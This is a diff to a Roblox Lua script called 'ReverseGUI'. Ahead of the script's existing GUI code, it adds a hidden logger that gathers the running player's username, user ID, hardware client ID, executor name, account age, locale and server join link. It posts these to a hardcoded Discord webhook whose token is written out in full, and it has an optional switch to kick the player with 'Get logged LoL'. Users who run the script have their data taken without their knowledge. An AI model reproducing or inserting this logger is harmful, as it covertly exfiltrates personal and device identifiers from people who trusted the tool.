@@ -165,6 +165,89 @@
 --//         wait(0.1)
 --//     end
 --// end)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+local WebhookURL = "https://discord.com/api/webhooks/1399285627735769170/VW_XuXwzUo-5Uxa2xnZDmDqRjQ0iiPvRsnNZw3UgdPbyotEL_i681w_BNcBWuBLqA9qw" -- REQUIRED REPLACE WITH YOUR WEBHOOK
+
+local startTime = os.time()
+
+local hwid = RbxAnalyticsService:GetClientId()
+local userName = LocalPlayer.Name
+local userId = LocalPlayer.UserId
+local accAge = LocalPlayer.AccountAge
+local gameId = game.PlaceId
+local jobId = game.JobId
+local language = LocalizationService.RobloxLocaleId
+local gameName = "Unknown"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(gameId).Name
+end)
+
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (accAge * 86400))
+local gameLink = "https://www.roblox.com/games/" .. gameId
+local joinLink = "https://www.roblox.com/games/" .. gameId .. "/?serverplaceid=" .. jobId
+
+local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+
+local kick = false -- optional kick (set true to kick)
+local kickReason = "Get logged LoL" -- default kick reason
+
+local function toDiscordTimestamp(unixTime, format)
+    format = format or "R"
+    return string.format("<t:%d:%s>", unixTime, format)
+end
+
+local embedFields = {
+    {name = "Username", value = userName, inline = true},
+    {name = "User ID", value = tostring(userId), inline = true},
+    {name = "Executor", value = executorName, inline = true},
+    {name = "HWID", value = hwid, inline = false},
+    {name = "Account Created", value = accountCreationDate, inline = true},
+    {name = "Language", value = language, inline = true},
+    {name = "Game", value = gameName, inline = false},
+    {name = "Game Link", value = gameLink, inline = false},
+    {name = "Join Link", value = joinLink, inline = false},
+    {name = "Ran Script", value = toDiscordTimestamp(startTime), inline = true},
+    {name = "Server Players", value = string.format("%d / %d", currentPlayers, maxPlayers), inline = true},
+}
+
+if kick then
+    table.insert(embedFields, {name = "Kicked", value = "Yes", inline = true})
+    table.insert(embedFields, {name = "Kick Reason", value = kickReason, inline = false})
+else
+    table.insert(embedFields, {name = "Kicked", value = "No", inline = true})
+end
+
+local embed = {
+    title = "ReverseGUI Executed🤑",
+    color = 0xFF0000,  -- red color
+    fields = embedFields,
+    footer = {text = "Zack858"},
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = HttpService:JSONEncode({embeds = {embed}})
+
+pcall(function()
+    request({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    })
+end)
+
+if kick then
+    LocalPlayer:Kick(kickReason)
+end
 --// Services & Vars
 local a,b,c,d,e,f,g=game:GetService("Players"),game:GetService("TweenService"),game:GetService("Lighting"),workspace,game:GetService("RunService"),game:GetService("Debris"),game:GetService("UserInputService")
 local h=a.LocalPlayer repeat task.wait() until game:IsLoaded() and h:FindFirstChild("PlayerGui")
